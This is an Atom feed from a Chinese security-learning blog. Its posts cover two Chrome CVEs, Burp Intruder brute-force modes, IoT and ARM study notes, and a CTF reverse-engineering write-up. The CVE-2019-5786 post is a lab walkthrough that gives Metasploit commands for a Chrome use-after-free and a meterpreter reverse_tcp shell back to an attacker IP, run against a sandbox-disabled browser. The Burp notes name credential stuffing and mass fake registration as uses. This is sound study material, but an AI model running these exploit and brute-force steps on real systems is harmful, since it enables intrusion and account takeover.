<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sinky&#39;s Blog</title>
  
  
  <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/atom.xml" rel="self"/>
  
  <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/"/>
  <updated>2022-08-09T03:29:41.243Z</updated>
  <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/</id>
  
  <author>
    <name>Sinky</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2020-6418</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/CVE-2020-6418/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/CVE-2020-6418/</id>
    <published>2022-08-09T03:28:28.298Z</published>
    <updated>2022-08-09T03:29:41.243Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>(资料来自绿盟科技)</p><p>2020年2月24日，google针对桌面版chrome浏览器发布更新以解决多个漏洞，包括已被发现的在野利用的高危漏洞CVE-2020-6418.</p><p>CVE-2020-6418存在于V8中的类型混淆漏洞，V8是chrome的开源JavaScript和WebAssembly引擎，该洞由Google威胁分析小组的Clement Lecigne发现并上报。</p><p>受影响产品版本：</p><p>Google Chrome Version&lt;80.0.3987.122</p><p>适用于windows,Mac,Linux.</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://blog.nsfocus.net/cve-2020-6418">http://blog.nsfocus.net/cve-2020-6418</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;(资料来自绿盟科技)&lt;/p&gt;
&lt;p&gt;2020年2月24日，google针对桌面版chrome浏览器发布更新以解决多个漏洞，包括已被发现的在野</summary>
      
    
    
    
    
    <category term="chrome调试" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/chrome%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>burp四种密码爆破模式学习</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/bp%E5%9B%9B%E7%A7%8D%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/bp%E5%9B%9B%E7%A7%8D%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-08-09T03:24:09.328Z</published>
    <updated>2022-08-09T03:25:20.887Z</updated>
    
    <content type="html"><![CDATA[<ul><li>Sniper:单参数爆破，多参数时同一个字典按顺序替换各参数，初始值有一个参数不变</li><li>Battering ram:多参数同时爆破，但用的是同一个字典</li><li>Pitchfork:多参数同时爆破，但用的是不同的字典</li><li>Cluster bamb:多参数做笛卡尔乘积模式爆破</li></ul><h1 id="Sniper-狙击手"><a href="#Sniper-狙击手" class="headerlink" title="Sniper(狙击手)"></a>Sniper(狙击手)</h1><p>（一对一）</p><p>一个参数a，若payload有x个，则执行x次。</p><p>两个参数a、b,先执行爆破a的x次，再执行b的y次，共x+y次爆破。</p><ul><li>此模式主要适用于：竞争条件测试(选择NULL payloads)，密码、验证码暴力破解，重放攻击等场景</li></ul><h1 id="Battering-ram-破城槌"><a href="#Battering-ram-破城槌" class="headerlink" title="Battering ram(破城槌)"></a>Battering ram(破城槌)</h1><p>（payload一对多）</p><p>一个参数a，若payload有x个，则执行x次。</p><p>两个参数a、b,payload被同事放到a、b变量中。适合需要在请求中把相同的输入放到多个位置的情况。</p><ul><li>此模式主要适用于：撞库</li></ul><h1 id="Pitchfork-音叉"><a href="#Pitchfork-音叉" class="headerlink" title="Pitchfork(音叉)"></a>Pitchfork(音叉)</h1><p>可以多组密码本payload</p><p>a:1,2</p><p>b:3,4</p><p>第一次爆破为 1，3</p><p>第二次爆破为 2，4</p><ul><li>此模式主要适用于：恶意注册</li></ul><h1 id="Cluster-bomb-集束炸弹"><a href="#Cluster-bomb-集束炸弹" class="headerlink" title="Cluster bomb(集束炸弹)"></a>Cluster bomb(集束炸弹)</h1><p>（多对多）</p><p>对payload组进行笛卡尔积，交叉组合，即a的一个payload值与b的每一个值进行组合爆破。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;Sniper:单参数爆破，多参数时同一个字典按顺序替换各参数，初始值有一个参数不变&lt;/li&gt;
&lt;li&gt;Battering ram:多参数同时爆破，但用的是同一个字典&lt;/li&gt;
&lt;li&gt;Pitchfork:多参数同时爆破，但用的是不同的字典&lt;/li&gt;
&lt;li&gt;Cl</summary>
      
    
    
    
    
    <category term="bp" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/bp/"/>
    
  </entry>
  
  <entry>
    <title>《物联网渗透测试》学习笔记1</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</id>
    <published>2022-08-09T03:24:06.948Z</published>
    <updated>2020-10-09T08:13:24.145Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-IOT渗透测试"><a href="#0x01-IOT渗透测试" class="headerlink" title="0x01 IOT渗透测试"></a>0x01 IOT渗透测试</h1><p>定义IoT生态系统与渗透测试生命周期</p><ul><li>渗透测试方法：<ul><li>黑盒测试</li><li>白盒测试</li><li>灰盒测试</li></ul></li></ul><h2 id="固件入门"><a href="#固件入门" class="headerlink" title="固件入门"></a>固件入门</h2><p>固件是一种写入硬件设备的软件，作用是对应用和各项系统功能实施控制，运行固件的设备称为嵌入式系统。</p><p>固件通常由bootloader、内核、文件系统以及其他资源组成，</p><p>固件组成：闪存、bootloader、内核、根文件系统。</p><ul><li>bootloader:主要作用包括RAM初始化（目的是存储易失性数据）、串口初始化、机器类型检测、内核参数链表设置、initramfs(基于RAM的初始文件系统)加载以及内核镜像调用等。ARM、MIPS架构中部分常见的bootloader包括：Redboot、u-boot以及barebox等。当bootloader启动内核之后，文件系统就完成了加载。</li><li>固件可以采用的文件系统类型：SquashFS、cramFS、JFFS2、YAFFS2以及ext2等。</li></ul><h2 id="IoT中的Web应用"><a href="#IoT中的Web应用" class="headerlink" title="IoT中的Web应用"></a>IoT中的Web应用</h2><p>通常嵌入书web应用被设计为在自包含的环境中运行</p><ul><li>目前iot领域主要有两种不同的web应用模型<ul><li>混合云模型：包含厂商或供应商提供的基于软件即服务的web应用，作用是同运行在嵌入式设备固件中的web应用程序建立连接，将数据从厂商的云服务器中同步到本地网络的嵌入式设备中。</li><li>独立嵌入式服务器模型</li></ul></li></ul><p>web通信：浏览器、、嵌入式服务器和web应用服务器之间的通信通常要么借助简单对象访问协议（SOAP）/XML等web服务，要么借助基于http/htps复合REST规范的API来实现。</p><h2 id="硬件设备基础"><a href="#硬件设备基础" class="headerlink" title="硬件设备基础"></a>硬件设备基础</h2><p>硬件输入：</p><ul><li>EEPROM，是非易失性存储器。以单个字节为单位进行读写，可通过电荷或紫外线照射擦除数据。读写次数有限。</li><li>NAND闪存以区块为单位读写。存储设备的boootloader。</li><li>UART接口是访问设备最为常见的方式。连接改接口后即可获得root权限。PCB上UART接口的引脚定义中包括Tx、Rx、Vcc和GND 4个引脚。连接UART接口前需要使用万用表识别出引脚。</li><li>JTAG接口是遵循IEEE 1149.1标准的另一种国际标准测试协议。用于芯片级和系统级的测试。，包含5个引脚：TDI、TDO、TMS、TCK、TRST.可以接到芯片的tap（测试访问口）</li></ul><h2 id="IoT无线通信简介"><a href="#IoT无线通信简介" class="headerlink" title="IoT无线通信简介"></a>IoT无线通信简介</h2><p>最常用协议：Wi-Fi(802.11)、ZigBee(802.15.4)、Z-Ware、蓝牙(802.15.1)、低功耗蓝牙。</p><h1 id="IoT威胁建模"><a href="#IoT威胁建模" class="headerlink" title="IoT威胁建模"></a>IoT威胁建模</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-IOT渗透测试&quot;&gt;&lt;a href=&quot;#0x01-IOT渗透测试&quot; class=&quot;headerlink&quot; title=&quot;0x01 IOT渗透测试&quot;&gt;&lt;/a&gt;0x01 IOT渗透测试&lt;/h1&gt;&lt;p&gt;定义IoT生态系统与渗透测试生命周期&lt;/p&gt;
&lt;ul&gt;
&lt;l</summary>
      
    
    
    
    
    <category term="IOT 《物联网渗透测试》" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/IOT-%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B/"/>
    
  </entry>
  
  <entry>
    <title>《ARM嵌入式Linux系统开发详解》学习笔记1</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E3%80%8AARM%E5%B5%8C%E5%85%A5%E5%BC%8FLinux%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E3%80%8AARM%E5%B5%8C%E5%85%A5%E5%BC%8FLinux%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</id>
    <published>2022-08-09T03:21:41.844Z</published>
    <updated>2022-08-09T03:22:14.420Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-嵌入式系统入门"><a href="#0x01-嵌入式系统入门" class="headerlink" title="0x01 嵌入式系统入门"></a>0x01 嵌入式系统入门</h1><p><b>什么是嵌入式系统：</b></p><p>一种为特定设备服务的，软件硬件可裁剪的计算机系统，形式变化多样、体积小。如手机、微波炉，对于手机、微波炉来说，需要小型计算机来控制，换句话，是需要把计算机全入到手机和微波炉里，也就是嵌入式系统，不需要严格地响应时间和数据吞吐量，最关键的是能够缩小体积以及功能专门化，嵌入式系统种类繁多，按照系统硬件的核心处理器来说可以分成嵌入式微控制器和嵌入式微处理器。</p><p><b>嵌入式微控制器：</b></p><p>嵌入式微控制器也就是传统意义上的单片机，是目前嵌入式系统的前身。单片机就是把一个计算机的主要功能集成到一个芯片上，即一个芯片就是一个计算机，体积小、结构简单、便于开发以及价格经济。</p><p>通常一个单片机芯片包含运算处理单元、ARM、Flash存储器以及外部接口，通过外部接口可以输出或者输入心寒，控制相应的设备，用户可以把编写好的代码烧写到单片机芯片内部来控制外部设备。</p><p><b>嵌入式微处理器：</b></p><p>单片机处理能力低，嵌入式微处理器是最近几年随着大规模集成电路发展同步，处理能力更强，目前主流嵌入式微处理器都是32位，而单片机多是8位和16位。</p><p><b>典型嵌入式系统组成：</b></p><p>嵌入式系统与传统PC一样，也是一种及计算机系统，由硬件和软件组成，硬件包括嵌入式微控制器和微处理器，以及一些外围元器件和外部设备；软件包括嵌入式操作系统和应用软件。</p><p>嵌入式系统种类繁多，不同的嵌入式系统软、硬件很难兼容，软件必须修改而硬件必须重新设计才能使用。</p><p>典型嵌入式系统:</p><ul><li>硬件：<ul><li>嵌入式处理器：处理器是整个系统的核心，负责处理所有的软件程序以及外部设备的信号</li><li>外部设备：在不同系统中有不同选择。</li></ul></li><li>软件：<ul><li>嵌入式操作系统：是软硬件的接口，负责管理系统的所有软件和硬件资源，还可以通过驱动程序与外部设备打交道。</li><li>应用软件：利用操作系统提供的功能开发出针对某个需求的程序，供用户使用。</li></ul></li></ul><h1 id="0x02-嵌入式软硬件系统"><a href="#0x02-嵌入式软硬件系统" class="headerlink" title="0x02 嵌入式软硬件系统"></a>0x02 嵌入式软硬件系统</h1><p>数字电路是计算机的基础。</p><p>进制转换</p><p>计算机组成原理</p><p>直接内存访问：DMA</p><p>软件：系统软件、应用软件</p><p>软件开发：需求分析、概要设计和详细设计、编码和调试、测试和维护。</p><p>常见软件开发模型：瀑布开发模型、增量开发模型、统一软件开发模型。</p><p>操作系统的基本结构都是内核、驱动程序、程序库。</p><h1 id="0x03-ARM处理器"><a href="#0x03-ARM处理器" class="headerlink" title="0x03 ARM处理器"></a>0x03 ARM处理器</h1><ul><li>微处理器<ul><li>通用微处理器：用于高性能计算</li><li>嵌入式微处理器：针对某种特定应用的高能力计算</li><li>微控制器：用于控制某种设备，通常集成了多种外部设备控制器，处理指令能力不强但价格低廉。</li></ul></li></ul><p>ARM:高性能RISC机器。</p><ul><li>芯片体积小，功耗低，成本低性能优异</li><li>支持Thumb(16位)和ARM(32位)</li><li>内部大量使用寄存器，执行指令速度快。</li><li>大部分指令是操作寄存器，很少访问外部内存</li><li>采用多级流水线结构处理速度快。</li><li>多种寻址方式，数据存取方式灵活</li><li>指令长度固定，便于编译器操作以及执行指令</li></ul><h3 id="ARM指令集"><a href="#ARM指令集" class="headerlink" title="ARM指令集"></a>ARM指令集</h3><ul><li>算术运算指令<ul><li>ADD:加法运算<ul><li>add dest,op1,op2 //dest是目的寄存器，op1 op2是操作数,dest=op1+op2</li></ul></li><li>ADC:带进位加法<ul><li>ADC dest,op1,op2</li></ul></li><li>SUB:减法<ul><li>sub dest,op1,op2</li><li>dest=op1-op2</li></ul></li><li>SBC：带进位减法</li></ul></li><li>逻辑运算指令<ul><li>AND:逻辑与(1 1为1，0 0为1，1 0为0)<ul><li>and dest,op1,op2</li><li>dest=op1 and op2</li></ul></li><li>EOR:异或（1 1为0，0 0为0，10为1）</li><li>MOV:复制数据<ul><li>mov dest,op1</li><li>dest=op1</li><li>mov r0,r0,LSL#3//r0=r0*8,LSL寄存器左移三位，即乘以8</li></ul></li></ul></li><li>分支指令<ul><li>B:跳转<ul><li>b 地址 //跳转到指定地址</li></ul></li></ul></li><li>数据传送指令<ul><li>单一数据传送指令：向内存装载和存储一个字节或一个字长的数据<ul><li>LDR Rd,地址</li><li>STR Rd,地址</li><li>LDR B Rd,地址</li><li>STR B Rd,地址</li></ul></li><li>多数据传送指令：向内存装载和存储多个字节或字的数据<ul><li>xxM Rn(!),&lt;寄存器列表&gt;{^}</li><li>xx:LD–装载，ST–存储</li><li>LDMED LDMIB//++i</li><li>LDMFD LDMIA//i++</li><li>LDMEA LDMDB//++*i</li><li>LDMFA LDMDA//*i++</li><li>STMFA STMIB//存储前增加地址</li><li>STMEA STMIA//存储后增加地址</li><li>STMFD STMDB//存储前增加值</li><li>STMED STMDA//存储后增加值</li></ul></li></ul></li></ul><p>ARM状态：0位表示ARM状态，1位表示Thumb状态,BX指令切换状态。</p><p>MMU:内存管理单元。</p><blockquote><p>LSL:逻辑左移，二进制从右往左移动，空位补0（就是原数值乘以2的移位次方）<br>LSR:逻辑右移，二进制从左往右，空位补0<br>ASR:算术右移，符号位不变，高位空出补0，低位补1<br>ROR:循环右移，低位移到高位<br>RRX:带扩展的循环右移：操作数右移一位，高端空出位用原C标志值填充</p></blockquote><h3 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h3><ul><li>立即寻址:用#表示数值<ul><li>subs r0,#1;r0=r0-1</li><li>mov r0,#0xff00;r0=0xff00</li></ul></li><li>寄存器寻址方式：读取寄存器得到操作数<ul><li>mov r1,r2;r1=r2</li><li>sub r0,r1,r2;r0=r1-r2</li></ul></li><li>寄存器偏移寻址：寄存器的值移位得结果<ul><li>mov r0,r1,LSL #3;r0=r1*8</li><li>ands r0,r2,LSL #3;r0= r2*8 and r1</li></ul></li><li>寄存器间接寻址：寄存器为地址，从对应内存重取出数据<ul><li>LDR r0,[r1];r1为地址，从内存中取出数据存入r0</li><li>SWP r0,r0,[r1];r1为地址，从内存中取出数据与r0交换</li></ul></li><li>基址寻址：把寄存器内容与指定便宜相加，得数据地址，后从内存中取出数据<ul><li>LDR r0,[r1,#0xf];r1数值与0xf相加得到数据地址</li><li>STR r0,[r1,#-2];r1数值-2得到数据地址</li></ul></li><li>多寄存器寻址：一次传输多个寄存器值<ul><li>LDMIA r1!,{r2<del>r7,r12};r1单元重数据读到r2</del>r7和r12,r1指定地址自动加1</li></ul></li><li>栈寻址：先进后出，通过栈指针寄存器寻址<ul><li>STMFD SP!,{R0<del>R7,LR};r0</del>r7和LR的内容压入堆栈</li><li>LDMFD SP!,{r0<del>r7,LR};从堆栈中取出数据到r0</del>r7和LR</li></ul></li></ul><h1 id="0x04-嵌入式Linux"><a href="#0x04-嵌入式Linux" class="headerlink" title="0x04 嵌入式Linux"></a>0x04 嵌入式Linux</h1><p>一般来说，嵌入式操作系统是由启动程序、核心、根文件系统组成，通过特殊的烧录工具将编译好的嵌入式系统文件影像烧写到目标板的只读存储器（ROM）或Flash存储器中。</p><h1 id="0x05-建立软件开发环境"><a href="#0x05-建立软件开发环境" class="headerlink" title="0x05 建立软件开发环境"></a>0x05 建立软件开发环境</h1><ul><li>运行在windows平台下得到Linux系统模拟环境：Cygwin.</li><li>linux下：串口工具minicom</li><li>windows下：串口工具xshell</li><li>ARM集成开发环境ADS<ul><li>c语言编译器armcc</li><li>c++语言编译器armcpp</li></ul></li></ul><h1 id="0x06-第一个linux应用程序"><a href="#0x06-第一个linux应用程序" class="headerlink" title="0x06 第一个linux应用程序"></a>0x06 第一个linux应用程序</h1><ul><li>vi创建源代码文件hello.c</li><li>gcc -c hello.c 编译运行</li></ul><h1 id="0x07-Linux应用程序编程基础"><a href="#0x07-Linux应用程序编程基础" class="headerlink" title="0x07 Linux应用程序编程基础"></a>0x07 Linux应用程序编程基础</h1><ul><li>堆栈</li><li>内存管理函数<ul><li>malloc():分配内存，不能初始化内存空间</li><li>free()：释放malloc()分配的内存</li></ul></li><li>实用的内存分配函数<ul><li>calloc():分配一块新内存，向应用程序分诶内存，分配后会初始化新分配的内存空间</li><li>realloc():改变一块已经分配的内存大小，函数调整后的内存空间起始地址有可能与原来的不同，所以需要realloc()函数的返回值。</li></ul></li><li>文件指针和流：FILE*fp</li><li>getc() /fgetc() /getchar()</li><li>POSIX文件I/O编程<ul><li>POSIX可移植操作系统接口</li><li>open() /creat() /close() /read() /write() /fcnt()修改一打开文件属性</li><li>文件头：<ul><li>&lt;sys/types.h&gt;</li><li>&lt;sys/stat.h&gt;</li><li>&lt;fcntl.h&gt;</li></ul></li></ul></li></ul><h1 id="0x08-开发多进程-x2F-线程程序"><a href="#0x08-开发多进程-x2F-线程程序" class="headerlink" title="0x08 开发多进程/线程程序"></a>0x08 开发多进程/线程程序</h1><ul><li>PCB进程控制块</li><li>fork()调用创建进程</li><li>退出进程：exit()、_exit()、atexit()、on_exit().</li><li>常用进程间通信方法：<ul><li>管道：单方向传送数据，只能在有共同父进程的进程间使用<ul><li>pipe()函数：创建管道</li><li>#include&lt;unistd.h&gt; int pipe(int filedes[1]);</li></ul></li><li>共享内存：不同进程可访问<ul><li>int shmget():创建</li><li>void *shmat：获得一个共享内存ID对应的内存其实地址</li><li>int shmdt：从程序中分立一块共享内存</li></ul></li><li>FIFO</li><li>消息队列</li><li>信号量</li><li>共享存储</li><li>socker</li></ul></li><li>Linux的多进程和多线程</li></ul><h1 id="0x09-网络通信应用"><a href="#0x09-网络通信应用" class="headerlink" title="0x09 网络通信应用"></a>0x09 网络通信应用</h1><ul><li>TCP/IP协议簇</li></ul><p><img src="https://i.loli.net/2020/09/07/REugKvzkfIn7B58.png" alt="捕获.PNG"></p><ul><li>IP协议：在传输层，负责数据包的传输管理<ul><li>实现两个功能：寻址和分段</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-嵌入式系统入门&quot;&gt;&lt;a href=&quot;#0x01-嵌入式系统入门&quot; class=&quot;headerlink&quot; title=&quot;0x01 嵌入式系统入门&quot;&gt;&lt;/a&gt;0x01 嵌入式系统入门&lt;/h1&gt;&lt;p&gt;&lt;b&gt;什么是嵌入式系统：&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;一种为特定设</summary>
      
    
    
    
    
    <category term="学习笔记" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF RE windows_re2</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/DDCTF2019re/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/DDCTF2019re/</id>
    <published>2022-08-09T03:17:04.100Z</published>
    <updated>2022-08-09T03:29:41.243Z</updated>
    
    <content type="html"><![CDATA[<p>esp定律脱壳Aspack，然后ida分析一波。</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> sub<span class="hljs-constructor">_401320()</span><br>{<br>  <span class="hljs-built_in">char</span> v1; <span class="hljs-comment">// [esp+8h] [ebp-C04h]</span><br>  <span class="hljs-built_in">char</span> v2; <span class="hljs-comment">// [esp+9h] [ebp-C03h]</span><br>  <span class="hljs-built_in">char</span> v3; <span class="hljs-comment">// [esp+408h] [ebp-804h]</span><br>  <span class="hljs-built_in">char</span> v4; <span class="hljs-comment">// [esp+409h] [ebp-803h]</span><br>  <span class="hljs-built_in">char</span> v5; <span class="hljs-comment">// [esp+808h] [ebp-404h]</span><br>  <span class="hljs-built_in">char</span> v6; <span class="hljs-comment">// [esp+809h] [ebp-403h]</span><br>  v3 = <span class="hljs-number">0</span>;<br>  sub<span class="hljs-constructor">_401C6A(&amp;<span class="hljs-params">v4</span>, 0, 0x3FF)</span>;<br>  v5 = <span class="hljs-number">0</span>;<br>  sub<span class="hljs-constructor">_401C6A(&amp;<span class="hljs-params">v6</span>, 0, 0x3FF)</span>;<br>  MEMORY<span class="hljs-literal">[<span class="hljs-number">0x785520C1</span>]</span>(<span class="hljs-string">"input code:"</span>);<br>  MEMORY<span class="hljs-literal">[<span class="hljs-number">0x785526D4</span>]</span>(<span class="hljs-string">"%s"</span>, &amp;v3);<br>  <span class="hljs-keyword">if</span> ( !(unsigned __int8)sub<span class="hljs-constructor">_4011F0()</span> )<br>  {<br>    MEMORY<span class="hljs-literal">[<span class="hljs-number">0x785520C1</span>]</span>(<span class="hljs-string">"invalid input\n"</span>);<br>    MEMORY<span class="hljs-literal">[<span class="hljs-number">0x78542455</span>]</span>(<span class="hljs-number">0</span>);<br>  }<br>  sub<span class="hljs-constructor">_401240(&amp;<span class="hljs-params">v5</span>)</span>;<br>  v1 = <span class="hljs-number">0</span>;<br>  sub<span class="hljs-constructor">_401C6A(&amp;<span class="hljs-params">v2</span>, 0, 0x3FF)</span>;<br>  MEMORY<span class="hljs-literal">[<span class="hljs-number">0x78552E73</span>]</span>(&amp;v1, <span class="hljs-string">"DDCTF{%s}"</span>, &amp;v5);<br>  <span class="hljs-keyword">if</span> ( !strcmp(&amp;v1, <span class="hljs-string">"DDCTF{reverse+}"</span>) )<br>    MEMORY<span class="hljs-literal">[<span class="hljs-number">0x785520C1</span>]</span>(<span class="hljs-string">"You've got it !!! %s\n"</span>, &amp;v1);<br>  <span class="hljs-keyword">else</span><br>    MEMORY<span class="hljs-literal">[<span class="hljs-number">0x785520C1</span>]</span>(<span class="hljs-string">"Something wrong. Try again...\n"</span>);<br>  return <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><ul><li>限制输入0-9,A-F,可想到十六进制</li><li>输入字符经过变换与“DDCTF{reverse+}”对比，相同则成功。</li></ul><p>先尝试输入字符串<code>1234567AAA</code>,得到加密后字符 <code>EjRWeqo=</code>,看着像base664,直接base64转成十六进制尝试，发现得到了我输入字符串。<br>将<code>reverse+</code>转换得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;esp定律脱壳Aspack，然后ida分析一波。&lt;/p&gt;
&lt;figure class=&quot;highlight reasonml&quot;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;</summary>
      
    
    
    
    
    <category term="RE" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-5786</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/CVE-2019-5786/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/CVE-2019-5786/</id>
    <published>2022-08-09T03:17:04.096Z</published>
    <updated>2022-08-09T03:29:41.239Z</updated>
    
    <content type="html"><![CDATA[<p>前言：</p><p>这个漏洞是我第一个自己进行复现和尝试写exp的洞，我希望在未来我能够对于复现漏洞和写exp能像吃饭喝水一样自信！加油！</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>kali<br>win7_x86<br>Google_chrome_(32bit)_v72.0.3626.119</p><p>浏览下载链接推荐：<a href="https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe">https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe</a></p><h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><p>kali启动msf,搜索chrome_filereader利用模块。(据谷歌官方公示，CVE-2019-5786是位于FileReader中的UAF漏洞)</p><p><code>root@kali:~# msfconsole -q</code></p><p><code>msf5 &gt; search chrome_filereader</code></p><blockquote><p>注：<br>1.<code>msfconsole -q</code>  是指启动工具msf，-q 不打印没用的东西出来（msf启动界面）之后可能需要专门整理一下有关msf工具的知识。<br>2.<code>search chrome_filereader</code>正则匹配搜索exp。exp存在则浮现。<br>3.什么是UAF漏洞：内存破坏漏洞，通常存在于浏览器中，详细可见博客文章“UAF漏洞简单学习”</p></blockquote><p>出现exp: <code>exploit/filereader/browser/chrome_filereader_uaf</code></p><p><img src="https://i.loli.net/2020/05/25/IcHhEGVmKiTvxyz.png" alt="捕获.PNG"></p><h3 id="简单了解FileReader对象的用法"><a href="#简单了解FileReader对象的用法" class="headerlink" title="简单了解FileReader对象的用法"></a>简单了解FileReader对象的用法</h3><p>Filereader 可以实现对文件内容或者缓冲区数（Blob）的异步读取</p><ul><li><p>readyState：表示读取状态</p><ul><li>empty,0,尚未读取</li><li>loading,1,正在读取</li><li>done,2,读取完成</li></ul></li><li><p>result：表示读取结果，具体格式与读取方式有关：</p><ul><li>readAsArrayBuffer</li><li>readAsBinaryString</li><li>readAsDataURL</li><li>readAsText</li></ul></li><li><p>onprogress：回调函数</p><ul><li>读取Blob触发</li><li>当数据较多时会周期性触发多次</li></ul></li><li><p>onloadend：回调函数</p><ul><li>读取操作完成时触发，不论读取成功或失败</li></ul></li></ul><p>查看模块信息</p><p><img src="https://i.loli.net/2020/05/25/dT2WQNsPg4qaBZH.png" alt="捕获.PNG"></p><p>漏洞介绍：</p><pre><code class="Payload">Description:  This exploit takes advantage of a use after free vulnerability in   Google Chrome 72.0.3626.119 running on Windows 7 x86. The   FileReader.readAsArrayBuffer function can return multiple references   to the same ArrayBuffer object, which can be freed and overwritten   with sprayed objects. The dangling ArrayBuffer reference can be used   to access the sprayed objects, allowing arbitrary memory access from   Javascript. This is used to write and execute shellcode in a   WebAssembly object. The shellcode is executed within the Chrome   sandbox, so you must explicitly disable the sandbox for the payload   to be successful.```选择payload`-&gt; set payload windows/meterpreter/reverse_tcp`&gt; 注：meterpreter/reverse_tcp：基于TCP的反向链接反弹shell，详细见文章“初识Meterpreter”设置payload参数：LHOST为kali ip`-&gt; set LHOST 192.168.119.128 `![捕获.PNG](https://i.loli.net/2020/05/25/chvQmOGL1Kqgebs.png)创建服务 `-&gt; set payload windows/meterpreter/reverse_tcp`![捕获.PNG](https://i.loli.net/2020/05/25/bNlUIHPxwkXcsrn.png)启动服务：run 或者exploit在win7下进入chrome文件目录，在目录下进去cmd，并以沙箱关闭状态执行chrome.exe`-&gt; chrome.exe --no-sandbox`在弹出的chome浏览器中访问kali ip:http://192.168.119.128:8080kali获得sessions查看sessions序号，通过反弹shell在win7上可执行命令。复现结束。### 后记在获取session时候我遇见了很多小问题导致我不能获取，比如win7应该是x86系统，比如win7的防火墙忘记关闭了，比如网速太慢，在历经无数崩溃瞬间我成功的获取了session.虽然后来再整理wp的时候，win7系统由于自动更新，chrome119版本也升级了，后来再安装却死活安装不上去，差点升天……### 